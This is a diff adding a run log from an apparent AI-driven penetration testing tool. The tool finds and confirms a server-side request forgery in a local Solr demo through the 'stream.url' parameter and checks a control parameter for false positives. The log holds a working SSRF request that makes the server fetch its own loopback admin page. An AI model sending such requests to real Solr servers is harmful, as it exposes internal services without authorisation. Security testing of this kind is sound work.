@@ -1,0 +1,84 @@
+20:54:26 clinkz.discovery.source_ingest INFO  source ingest: 3 files → 1 entrypoints, 1 call-sites, 0 guards (84 consts, 1 wrappers)
+20:54:26 clinkz.discovery.engine      INFO  discovery: 1 active primitives, 1 Δ, 1 reachability edges, 1 hypotheses
+20:54:26 clinkz.discovery.source_ingest INFO  source ingest: 3 files → 1 entrypoints, 1 call-sites, 0 guards (84 consts, 1 wrappers)
+20:54:26 clinkz.discovery.engine      INFO  discovery: 1 active primitives, 1 Δ, 1 reachability edges, 1 hypotheses
+20:54:26 orchestrator                 INFO  Discovery: 1 hypothesis task(s) from source (1 entrypoints, 1 Δ, 1 reachability edges) base=http://localhost:8983/solr/demo/debug/dump
+20:54:26 clinkz.llm.factory           INFO  Initializing LLM client: provider=anthropic agent_role=-
+20:54:28 clinkz.state                 INFO  State store connected (WAL mode): C:\Users\ptkva\OneDrive\Documents\clinkz\outputs\solr_discovery.db
+20:54:28 clinkz.state                 INFO  Created engagement: Solr RemoteStreaming SSRF (transfer slice) (fb606cbc-f442-4dec-967f-069185358195)
+20:54:28 clinkz.llm.fallback.ResilientLLMClient INFO  ResilientLLMClient initialised — role=exploit profile=reasoning chain=['anthropic']
+20:54:28 clinkz.agents.base.ExploitAgent INFO  Discovery handoff: 1 hypothesis task(s) received
+20:54:28 clinkz.agents.base.ExploitAgent INFO  Step 1: LLM planning exploits
+20:54:29 clinkz.agents.base.ExploitAgent WARNING LLM plan unparseable/empty; re-prompting LLM once for valid JSON
+20:54:32 clinkz.agents.base.ExploitAgent INFO  Coverage union: 1 LLM-planned + 0 deterministic coverage tasks (cap 150)
+20:54:32 clinkz.agents.base.ExploitAgent INFO  Discovery union: 1 hypothesis task(s) added to plan (2 total, cap 150)
+20:54:32 clinkz.agents.base.ExploitAgent INFO  Step 2: Executing 2 planned tasks (T1=2, T2=0, T3=0)
+20:54:35 clinkz.agents.base.ExploitAgent WARNING Unknown test method: GET
+20:54:35 clinkz.llm.factory           INFO  Initializing LLM client: provider=anthropic agent_role=-
+20:55:05 clinkz.agents.base.ExploitAgent INFO  Step 3: LLM analyzing 1 findings
+20:55:18 clinkz.agents.base.ExploitAgent INFO  Step 4: No retry targets — skipping
+20:55:18 clinkz.agents.base.ExploitAgent INFO  Step 3b: no false-positive suspects to mark
+20:55:18 clinkz.agents.base.ExploitAgent INFO  Step 5: 0 technique results recorded to KB (incremental)
+20:55:18 clinkz.agents.base.ExploitAgent INFO  Step 6: Building result
+20:55:18 clinkz.agents.base.ReportAgent INFO  ReportAgent starting (simple mode) for 'Solr RemoteStreaming SSRF' (fb606cbc-f442-4dec-967f-069185358195)
+20:55:18 clinkz.agents.base.ReportAgent INFO  Loaded 1 findings, 0 targets
+20:55:18 clinkz.agents.base.ReportAgent INFO  JSON report written to outputs\fb606cbc-f442-4dec-967f-069185358195\report_fb606cbc-f442-4dec-967f-069185358195.json
+20:55:18 clinkz.agents.base.ReportAgent INFO  Markdown report written to outputs\fb606cbc-f442-4dec-967f-069185358195\report_fb606cbc-f442-4dec-967f-069185358195.md
+20:55:18 clinkz.agents.base.ReportAgent INFO  Report complete: 1 findings, risk_rating=High
+
+==============================================================================
+PRE-FLIGHT
+==============================================================================
+Solr /solr/ -> HTTP 200; core=demo; enableRemoteStreaming -> True (HTTP 200)
+ANTHROPIC_API_KEY present: True; TOOL_EXEC_MODE=local
+
+==============================================================================
+1. SOURCE INGESTION + DISCOVERY (wired Orchestrator step → ExploitTask)
+==============================================================================
+ingested files=3 coverage=partial tech=['Java']
+  entrypoint: ['GET'] route='' handler=SolrRequestParsers params=['stream.url', 'stream.file', 'stream.body']
+  call-site : egress_fetch openConnection() tainted_by='stream.url' @SolrRequestParsers.java:204
+  Δ: exposed conf=0.75 :: no guard on the capability call site — present but unconstrained (intent-gap)
+  reach: static_confirmed conf=0.9 :: intra-function: request param 'stream.url' → new URL(...) → openConnection() in SolrRequestParsers (C:\Users\ptkva\OneDrive\Documents\clinkz\tests\fixtures\solr_remote_streaming\SolrRequestParsers.java:204)
+
+black-box: 'stream.url' injection point discoverable by crawling /solr/? False (framework param on the shared parser → gray-box only)
+  → ExploitTask: _test_ssrf GET http://localhost:8983/solr/demo/debug/dump
+      params=['stream.url'] locations={'stream.url': 'query'} carrier=[]
+
+==============================================================================
+2. PROOF — hand tasks to Exploit via the real run() handoff, run the pipeline
+==============================================================================
+exploit summary: Exploit phase complete. 2 tests run, 1 findings. By severity: {'high': 1}. 0 results recorded to KB.
+
+findings in state: 1  (ssrf: 1)
+  [HIGH] Server-Side Request Forgery (SSRF) — reflected_internal  status=confirmed
+      • Request: SSRF reflected_internal http://localhost:8983/solr/demo/debug/dump — stream.url=http://127.0.0.1:8983/solr/
+      • Response: loopback fetch reflected in-scope internal content ('Solr Admin') via http://127.0.0.1:8983/solr/ (status 200)
+      • phases_completed=6 verified=True strength=verified
+      • exploitation_type=reflected_internal
+      • capability=fetch_confirmed=True,content_reflected=True,schemes=['http']
+      • candidate_param=stream.url
+      • internal_target=http://127.0.0.1:8983/solr/
+      • indicator_type=internal_service
+
+==============================================================================
+3. ZERO-FP — non-fetch control param 'q' on the same endpoint
+==============================================================================
+  isolated control param 'q' → 0 SSRF findings (expect 0)
+
+==============================================================================
+REPORT + TRACE (raw artifact paths)
+==============================================================================
+engagement_id : fb606cbc-f442-4dec-967f-069185358195
+report (json) : outputs\fb606cbc-f442-4dec-967f-069185358195\report_fb606cbc-f442-4dec-967f-069185358195.json
+report (md)   : outputs\fb606cbc-f442-4dec-967f-069185358195\report_fb606cbc-f442-4dec-967f-069185358195.md
+trace (jsonl) : C:\Users\ptkva\OneDrive\Documents\clinkz\outputs\fb606cbc-f442-4dec-967f-069185358195\trace.jsonl
+
+==============================================================================
+VERDICT
+==============================================================================
+  SSRF CONFIRMED in-band (P3, genuine)         : True
+  raw-auditable ConfirmationEvidence in finding: True
+  zero false positives (control param 'q')     : True
+
+  RESULT: PASS
